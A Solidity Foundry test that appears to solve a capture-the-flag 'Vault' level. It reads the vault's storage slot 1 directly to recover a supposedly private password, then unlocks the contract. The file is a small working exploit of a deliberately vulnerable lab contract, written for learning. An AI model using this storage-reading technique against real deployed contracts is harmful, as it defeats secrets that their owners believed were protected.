pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/VaultFactory.sol';
import 'levels/Vault.sol';
import 'utils/TestUtils.sol';
import 'forge-std/console.sol';

contract VaultTest is Test {
  address player;
  Utils utils;
  VaultFactory vaultFactory;
  address payable vaultAddress;
  Vault vault;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    vaultFactory = new VaultFactory();
    vaultAddress = payable(vaultFactory.createInstance(player));
    vault = Vault(vaultAddress);
  }

  function testHack() public {
    // load storage slot that stores password
    bytes32 password = vm.load(vaultAddress, bytes32(uint256(1)));

    vault.unlock(password);

    assertTrue(vaultFactory.validateInstance(vaultAddress, player), 'Level not solved');
  }
}
